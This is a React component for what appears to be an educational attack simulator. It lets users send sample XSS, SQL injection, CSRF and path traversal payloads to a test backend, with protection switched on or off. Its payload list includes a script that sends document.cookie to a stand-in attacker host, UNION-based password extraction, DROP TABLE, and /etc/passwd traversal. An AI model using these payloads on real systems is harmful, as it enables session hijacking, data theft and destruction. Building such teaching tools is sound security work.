import { useState } from 'react';
import { securityAPI } from '../services/api';
import TechnicalProofPanel from './TechnicalProofPanel';
import LiveExecutionLog from './LiveExecutionLog';

/**
 * Enhanced Attack Simulator with TECHNICAL PROOF
 * Shows actual evidence of attack execution, not just UI confirmations
 */
function AttackSimulatorEnhanced({ type, protection, onExecute }) {
    const [selectedPayload, setSelectedPayload] = useState('');
    const [result, setResult] = useState(null);
    const [loading, setLoading] = useState(false);
    const [isExecuting, setIsExecuting] = useState(false);
    const [showDetails, setShowDetails] = useState(false);
    const [showProof, setShowProof] = useState(true); // Default show proof

    const attacks = {
        xss: {
            title: 'Cross-Site Scripting (XSS)',
            severity: 'High',
            description: 'Injects malicious scripts into web pages viewed by other users',
            impact: 'Can steal cookies, session tokens, or redirect users to malicious sites',
            whatActuallyHappens: 'Your script gets inserted into HTML. Without protection, it executes in victim browsers. With protection, dangerous tags are stripped before rendering.',
            payloads: [
                {
                    name: 'Basic Script Alert',
                    code: '<script>alert("XSS")</script>',
                    risk: 'Executes JavaScript directly in the page',
                    technical: 'The <script> tag would be parsed by browser and execute immediately'
                },
                {
                    name: 'Cookie Theft',
                    code: '<script>fetch("//attacker.com?c="+document.cookie)</script>',
                    risk: 'Steals all cookies and sends to attacker',
                    technical: 'Exfiltrates document.cookie to remote server - session hijacking'
                },
                {
                    name: 'Image Error Handler',
                    code: '<img src=x onerror="alert(\'XSS\')">',
                    risk: 'Uses broken image to trigger code execution',
                    technical: 'Event handler executes when image fails to load'
                }
            ]
        },
        sql: {
            title: 'SQL Injection',
            severity: 'Critical',
            description: 'Manipulates database queries to access or modify data',
            impact: 'Can expose entire database, bypass authentication, or delete data',
            whatActuallyHappens: 'Your input is concatenated into SQL query string. Without protection, it becomes executable code. With protection, parameterized queries treat it as data.',
            payloads: [
                {
                    name: 'Authentication Bypass',
                    code: "' OR '1'='1' --",
                    risk: 'Makes WHERE clause always true, bypassing login',
                    technical: 'Query becomes: WHERE username = \'\' OR \'1\'=\'1\' -- (always true)'
                },
                {
                    name: 'Data Extraction',
                    code: "' UNION SELECT username, password FROM users--",
                    risk: 'Combines queries to extract sensitive data',
                    technical: 'UNION appends results from a second SELECT - leaks user table'
                },
                {
                    name: 'Database Destruction',
                    code: "'; DROP TABLE users; --",
                    risk: 'Executes multiple queries to damage database',
                    technical: 'Stacked queries: first query ends, then DROP executes (if enabled)'
                }
            ]
        },
        csrf: {
            title: 'Cross-Site Request Forgery (CSRF)',
            severity: 'High',
            description: 'Forces users to execute unwanted actions on a web application',
            impact: 'Can perform actions on behalf of authenticated users without their knowledge',
            whatActuallyHappens: 'Attacker creates malicious site that sends requests to YOUR site using victim\'s cookies. Without CSRF tokens, server can\'t tell if request is legitimate.',
            payloads: [
                {
                    name: 'Forged Request',
                    code: 'invalid_token_attempt',
                    risk: 'Attempts to bypass token validation',
                    technical: 'Sends request without valid CSRF token - should be rejected'
                }
            ]
        },
        path: {
            title: 'Path Traversal',
            severity: 'High',
            description: 'Accesses files outside the intended directory',
            impact: 'Can read sensitive system files and configuration',
            whatActuallyHappens: 'The ../ sequences navigate up directory tree. Without validation, filesystem resolves path outside allowed directory. With validation, traversal is detected and blocked.',
            payloads: [
                {
                    name: 'Unix Password File',
                    code: '../../../etc/passwd',
                    risk: 'Attempts to read system password file',
                    technical: 'Navigates up 3 levels, then into /etc/passwd - contains user accounts'
                },
                {
                    name: 'Application Config',
                    code: '../../config/database.yml',
                    risk: 'Seeks database credentials',
                    technical: 'Targets common config file location with DB passwords'
                }
            ]
        }
    };

    const attack = attacks[type];
    if (!attack) return null;

    const executeAttack = async () => {
        if (!selectedPayload) {
            setResult({ error: 'Please select an attack payload first' });
            return;
        }

        setLoading(true);
        setIsExecuting(true);
        setResult(null);

        // Simulate realistic execution time for live logging
        setTimeout(async () => {
            try {
                let response;
                switch (type) {
                    case 'xss':
                        response = await securityAPI.testXSS({ input: selectedPayload, protection });
                        break;
                    case 'sql':
                        response = await securityAPI.testSQL({ input: selectedPayload, protection });
                        break;
                    case 'csrf':
                        response = await securityAPI.testCSRF({ csrfToken: selectedPayload, protection });
                        break;
                    case 'path':
                        response = await securityAPI.testPathTraversal({ path: selectedPayload, protection });
                        break;
                    default:
                        throw new Error('Unknown attack type');
                }

                setResult(response.data);
                onExecute(type, selectedPayload, !response.data.vulnerable);
            } catch (error) {
                setResult({ error: 'Test failed: ' + error.message });
            } finally {
                setLoading(false);
            }
        }, 1500); // Wait for live log to complete
    };

    return (
        <div className="card">
            <div className="p-6">
                {/* Header */}
                <div className="flex items-start justify-between mb-4">
                    <div className="flex-1">
                        <div className="flex items-center gap-3 mb-2">
                            <h3 className="text-lg font-semibold text-gray-900">{attack.title}</h3>
                            <span className={`px-2 py-1 rounded-full text-xs font-medium ${
                                attack.severity === 'Critical' ? 'bg-red-100 text-red-700' :
                                attack.severity === 'High' ? 'bg-orange-100 text-orange-700' :
                                'bg-yellow-100 text-yellow-700'
                            }`}>
                                {attack.severity}
                            </span>
                        </div>
                        <p className="text-sm text-gray-600">{attack.description}</p>
                    </div>
                    <div className={`px-3 py-1 rounded-full text-xs font-medium ${
                        protection ? 'bg-green-100 text-green-700' : 'bg-red-100 text-red-700'
                    }`}>
                        {protection ? '🛡️ Protected' : '⚠️ Vulnerable'}
                    </div>
                </div>

                {/* What Actually Happens */}
                <div className="mb-4 p-3 bg-blue-50 border border-blue-200 rounded-lg">
                    <div className="text-xs font-bold text-blue-800 mb-1">🔍 What Actually Happens:</div>
                    <p className="text-xs text-blue-700">{attack.whatActuallyHappens}</p>
                </div>

                {/* Technical Details Toggle */}
                <button
                    onClick={() => setShowDetails(!showDetails)}
                    className="text-sm text-indigo-600 hover:text-indigo-500 mb-4"
                >
                    {showDetails ? 'Hide' : 'Show'} Technical Details →
                </button>

                {showDetails && (
                    <div className="mb-4 p-3 bg-gray-50 rounded-lg">
                        <p className="text-xs text-gray-600">
                            <strong>Impact:</strong> {attack.impact}
                        </p>
                    </div>
                )}

                {/* Payload Selection */}
                <div className="space-y-2 mb-4">
                    <label className="block text-sm font-medium text-gray-700">
                        Select Attack Payload:
                    </label>
                    {attack.payloads.map((payload, index) => (
                        <button
                            key={index}
                            onClick={() => setSelectedPayload(payload.code)}
                            className={`w-full text-left p-3 rounded-lg border transition-all ${
                                selectedPayload === payload.code
                                    ? 'border-indigo-500 bg-indigo-50'
                                    : 'border-gray-200 hover:border-gray-300 bg-white'
                            }`}
                        >
                            <div className="font-medium text-sm">{payload.name}</div>
                            <code className="text-xs bg-gray-100 px-2 py-1 rounded mt-1 inline-block font-mono break-all">
                                {payload.code}
                            </code>
                            <div className="text-xs text-gray-500 mt-1">💡 {payload.risk}</div>
                            {payload.technical && (
                                <div className="text-xs text-blue-600 mt-1">
                                    🔧 Technical: {payload.technical}
                                </div>
                            )}
                        </button>
                    ))}
                </div>

                {/* Execute Button */}
                <button
                    onClick={executeAttack}
                    disabled={loading || !selectedPayload}
                    className="w-full btn-primary justify-center disabled:opacity-50 disabled:cursor-not-allowed"
                >
                    {loading ? (
                        <span className="flex items-center gap-2">
                            <span className="spinner"></span>
                            Executing Attack...
                        </span>
                    ) : (
                        'Execute Attack & Show Proof'
                    )}
                </button>

                {/* Live Execution Log */}
                <LiveExecutionLog
                    isExecuting={isExecuting}
                    attackType={type}
                    payload={selectedPayload}
                    onComplete={() => setIsExecuting(false)}
                />

                {/* Result Summary */}
                {result && !result.error && (
                    <div className={`mt-4 p-4 rounded-lg ${
                        result.vulnerable ? 'bg-red-50 border border-red-200' : 'bg-green-50 border border-green-200'
                    }`}>
                        <div className="flex items-start gap-3">
                            <span className="text-xl">
                                {result.vulnerable ? '🚨' : '✅'}
                            </span>
                            <div className="flex-1">
                                <p className={`font-medium text-sm ${
                                    result.vulnerable ? 'text-red-700' : 'text-green-700'
                                }`}>
                                    {result.vulnerable ? 'Attack Succeeded!' : 'Attack Blocked!'}
                                </p>
                                <p className="text-sm text-gray-600 mt-1">
                                    {result.message}
                                </p>
                            </div>
                        </div>
                    </div>
                )}

                {/* Error Display */}
                {result?.error && (
                    <div className="mt-4 p-4 bg-gray-50 border border-gray-200 rounded-lg">
                        <p className="text-sm text-gray-700">⚠️ {result.error}</p>
                    </div>
                )}

                {/* Technical Proof Panel */}
                {showProof && result && !result.error && (
                    <>
                        <div className="mt-4 flex items-center justify-between">
                            <div className="text-sm font-semibold text-gray-900">
                                📊 Technical Proof & Evidence
                            </div>
                            <button
                                onClick={() => setShowProof(!showProof)}
                                className="text-xs text-gray-600 hover:text-gray-900"
                            >
                                Hide Proof
                            </button>
                        </div>
                        <TechnicalProofPanel
                            attackType={type}
                            payload={selectedPayload}
                            result={result}
                        />
                    </>
                )}

                {/* Call to Action */}
                {result && !showProof && (
                    <div className="mt-4">
                        <button
                            onClick={() => setShowProof(true)}
                            className="w-full py-2 px-4 bg-blue-50 hover:bg-blue-100 text-blue-700 rounded-lg text-sm font-medium transition-colors"
                        >
                            📊 Show Technical Proof & Evidence
                        </button>
                    </div>
                )}
            </div>
        </div>
    );
}

export default AttackSimulatorEnhanced;
